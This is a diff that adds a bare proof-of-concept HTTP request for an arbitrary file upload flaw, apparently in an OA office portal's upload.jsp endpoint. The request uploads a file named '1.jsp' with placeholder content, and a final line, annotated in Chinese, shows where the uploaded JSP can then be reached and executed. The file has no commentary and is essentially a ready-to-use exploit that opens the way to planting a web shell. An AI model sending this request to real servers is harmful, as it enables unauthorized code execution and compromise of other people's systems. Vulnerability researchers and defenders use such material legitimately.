@@ -1,0 +1,19 @@
+POST /defaultroot/platform/portal/layout/common/upload.jsp?portletSettingId=123&path=dir HTTP/1.1
+Host: IP
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36
+Connection: close
+Content-Length: 184
+Content-Type: multipart/form-data; boundary=b0d829daa06c13d6b3e16b0ad21d1eed
+Cookie: OASESSIONID=416B4CE965CD27DEED8197A8528A33E6
+Accept-Encoding: gzip, deflate
+
+--b0d829daa06c13d6b3e16b0ad21d1eed
+Content-Disposition: form-data; name="file"; filename="1.jsp"
+Content-Type: application/octet-stream
+
+111
+--b0d829daa06c13d6b3e16b0ad21d1eed--
+
+
+
+http://ip:port/defaultroot/upload/dir(path参数的值)/202311(年月)/(返回的文件名).jsp
